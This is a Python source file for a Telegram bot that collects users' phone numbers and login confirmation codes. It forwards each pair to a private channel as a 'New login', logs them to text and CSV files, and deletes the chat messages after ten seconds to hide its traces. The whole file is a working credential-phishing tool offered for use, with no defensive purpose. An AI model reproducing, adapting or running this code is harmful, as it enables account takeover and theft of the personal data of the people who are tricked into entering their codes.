#!/usr/bin/env python3
import os
import csv
import logging
import asyncio
from datetime import datetime, timedelta

from aiogram import Bot, Dispatcher, types
from aiogram.types import Message, ReplyKeyboardMarkup, KeyboardButton
from aiogram.dispatcher import FSMContext
from aiogram.contrib.fsm_storage.memory import MemoryStorage
from aiogram.dispatcher.filters.state import State, StatesGroup

# === Конфигурация через переменные окружения ===
# TOKEN хранится в секрете с именем PLAY
TOKEN = os.getenv("PLAY", "").strip()
# ID канала хранится в секрете с именем CHANNEL
CHANNEL = os.getenv("CHANNEL", "").strip()
# ADMIN ID хранится в ADMIN_ID
ADMIN_ID = os.getenv("ADMIN_ID", "").strip()

if not TOKEN:
    raise RuntimeError("Missing env var PLAY (bot token).")
if not CHANNEL:
    raise RuntimeError("Missing env var CHANNEL (channel id).")
if not ADMIN_ID:
    raise RuntimeError("Missing env var ADMIN_ID (admin user id).")

try:
    CHANNEL_ID = int(CHANNEL)
    ADMIN_ID = int(ADMIN_ID)
except ValueError:
    raise RuntimeError("CHANNEL and ADMIN_ID must be integer values (CHANNEL usually starts with -100).")

# === Файлы логов ===
LOG_FILE = "logins.txt"
CSV_FILE = "submissions.csv"

logging.basicConfig(
    filename=LOG_FILE,
    level=logging.INFO,
    format="%(asctime)s | %(levelname)s | %(message)s"
)

# создаём CSV с заголовком, если ещё нет
if not os.path.exists(CSV_FILE):
    with open(CSV_FILE, mode="w", newline="", encoding="utf-8") as f:
        writer = csv.writer(f)
        writer.writerow(["timestamp", "user_id", "username", "phone", "code"])

# === Инициализация бота и диспетчера ===
bot = Bot(token=TOKEN)
dp = Dispatcher(bot, storage=MemoryStorage())

# === FSM состояния ===
class AuthFlow(StatesGroup):
    waiting_for_phone = State()
    waiting_for_code = State()

# память для ограничения повторных отправок (24 часа)
user_last_submit = {}

# === Вспомогательная функция: отправить сообщение и удалить через delay секунд ===
async def send_and_delete(chat_id: int, text: str, previous_msg: Message = None, reply_markup=None, delay: int = 10):
    if previous_msg:
        try:
            await bot.delete_message(chat_id, previous_msg.message_id)
        except Exception:
            pass
    msg = await bot.send_message(chat_id, text, reply_markup=reply_markup)
    await asyncio.sleep(delay)
    try:
        await bot.delete_message(chat_id, msg.message_id)
    except Exception:
        pass
    return msg

# === Команда /start ===
@dp.message_handler(commands=["start"])
async def cmd_start(message: Message):
    kb = ReplyKeyboardMarkup(resize_keyboard=True)
    kb.add(KeyboardButton("📱 Отправить номер", request_contact=True))
    await send_and_delete(message.chat.id, "Нажми кнопку, чтобы отправить номер:", message, reply_markup=kb)
    await AuthFlow.waiting_for_phone.set()

# === Приём контакта (номер телефона) ===
@dp.message_handler(content_types=types.ContentType.CONTACT, state=AuthFlow.waiting_for_phone)
async def handle_contact(message: Message, state: FSMContext):
    if not message.contact or not message.contact.phone_number:
        await send_and_delete(message.chat.id, "Не удалось получить контакт. Попробуй ещё раз.", message)
        return
    phone = message.contact.phone_number
    await state.update_data(phone=phone)
    await send_and_delete(message.chat.id, "Теперь введи код подтверждения (до 6 цифр):", message)
    await AuthFlow.waiting_for_code.set()

# === Приём кода ===
@dp.message_handler(state=AuthFlow.waiting_for_code)
async def handle_code(message: Message, state: FSMContext):
    uid = message.from_user.id
    now = datetime.now()

    last = user_last_submit.get(uid)
    if last and (now - last) < timedelta(hours=24):
        await send_and_delete(message.chat.id, "⏳ Ты уже отправлял данные сегодня. Попробуй позже.", message)
        await state.finish()
        return

    text = (message.text or "").strip()
    if not text.isdigit() or len(text) > 6:
        await send_and_delete(message.chat.id, "❌ Неверный формат кода. Введи числовой код до 6 символов.", message)
        return

    data = await state.get_data()
    phone = data.get("phone", "unknown")
    code = text
    username = message.from_user.username or ""
    timestamp = now.isoformat()

    channel_text = (
        f"📲 Новый логин:\n"
        f"Номер: {phone}\n"
        f"Код: {code}\n"
        f"UserID: {uid}\n"
        f"Username: @{username}\n"
        f"Время: {timestamp}"
    )

    try:
        await bot.send_message(CHANNEL_ID, channel_text)
    except Exception as e:
        logging.exception("Failed to send to channel: %s", e)

    logging.info(f"Номер:{phone} | Код:{code} | UserID:{uid} | Username:@{username}")

    try:
        with open(CSV_FILE, mode="a", newline="", encoding="utf-8") as f:
            writer = csv.writer(f)
            writer.writerow([timestamp, uid, username, phone, code])
    except Exception:
        logging.exception("Failed to write CSV")

    user_last_submit[uid] = now

    await send_and_delete(message.chat.id, "✅ Данные отправлены.", message)
    await state.finish()

# === Команда /stats для админа ===
@dp.message_handler(commands=["stats"])
async def cmd_stats(message: Message):
    if message.from_user.id != ADMIN_ID:
        return
    count = len(user_last_submit)
    await send_and_delete(message.chat.id, f"📈 Сегодня отправлено логинов: {count}", message)

# === Логирование ошибок ===
@dp.errors_handler()
async def global_error_handler(update, exception):
    logging.exception("Unhandled exception: %s", exception)
    return True

# === Запуск ===
if __name__ == "__main__":
    from aiogram import executor
    executor.start_polling(dp)
